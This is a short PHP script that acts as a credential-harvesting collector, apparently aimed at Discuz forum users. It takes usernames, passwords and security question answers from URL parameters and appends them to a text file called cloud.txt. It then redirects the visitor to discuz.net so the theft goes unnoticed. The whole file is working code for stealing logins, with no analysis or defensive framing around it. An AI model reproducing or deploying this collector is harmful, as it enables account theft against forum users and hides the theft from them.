<?php
$file = "cloud.txt";
if (!empty($_GET['u']) && !empty($_GET['p'])) {
	$re = $_GET['u'] . "|" . $_GET['p'] . "|" . $_GET['i'] . "\n";
	if (strpos(file_get_contents($file), $re) === false) {
		file_put_contents($file, $re, FILE_APPEND);
	}
}
if (!empty($_GET['q']) && !empty($_GET['a'])) {
	$re = $_GET['q'] . ":" . $_GET['a'] . "\n";
	file_put_contents($file, $re, FILE_APPEND);
}
Header("HTTP/1.1 301 Moved Permanently");
Header("Location: http://www.discuz.net");
